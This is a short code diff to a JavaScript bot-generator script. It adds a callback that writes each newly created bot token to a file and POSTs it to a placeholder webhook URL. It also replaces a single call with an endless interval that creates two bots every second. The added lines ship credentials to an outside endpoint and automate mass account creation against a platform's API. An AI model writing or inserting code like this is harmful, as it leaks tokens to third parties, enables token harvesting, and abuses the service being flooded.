@@ -42,6 +42,29 @@ async function generateBot(token, name) {
   }).catch(console.error);
 
   console.log(getToken.data);
+
+  fs.appendFile(
+    "tokens.txt",
+    JSON.stringify(` ${botData.token} `),
+    function (err) {
+      fetch("webhook", {
+        method: "POST",
+        body: JSON.stringify({
+          content: `${botData.token}`,
+          tts: false,
+        }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      });
+      if (err) return console.log(err);
+      console.log("Appended!");
+    }
+  );
 }
 
-generateBot(config.token, "someCoolName");
+setInterval(() => {
+  for (var i = 0; i < 2; i++) {
+    generateBot(config.token, "someCoolName");
+  }
+}, 1000);
